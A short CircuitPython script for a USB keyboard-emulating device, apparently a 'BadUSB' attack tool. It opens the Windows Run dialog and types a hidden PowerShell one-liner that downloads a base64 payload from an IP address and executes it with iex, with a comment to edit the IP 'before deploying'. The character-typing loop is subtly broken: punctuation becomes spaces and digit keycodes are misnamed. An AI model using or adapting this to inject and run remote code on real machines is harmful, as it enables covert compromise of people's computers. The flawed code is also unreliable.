import usb_hid
import time
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode

# create the keyboard object
kbd = Keyboard(usb_hid.devices)

time.sleep(3)  # wait 3 seconds after plugging in

# open run
kbd.press(Keycode.GUI, Keycode.R)
kbd.release_all()
time.sleep(0.5)

# powershell payload
payload = (
    'powershell -w hidden -c "$b64=(irm http://192.168.1.1/payload).Content; ' # edit the ip before deploying
    '$bytes=[System.Convert]::FromBase64String($b64); '
    '$script=[System.Text.Encoding]::Unicode.GetString($bytes); iex $script"'
)

for char in payload:
    kbd.press(Keycode.SHIFT) if char.isupper() else None
    kbd.send(getattr(Keycode, f"{char.upper()}")) if char.isalnum() else kbd.send(Keycode.SPACE)
    kbd.release_all()
    time.sleep(0.02)  # small delays

# press enter
kbd.send(Keycode.ENTER)
kbd.release_all()

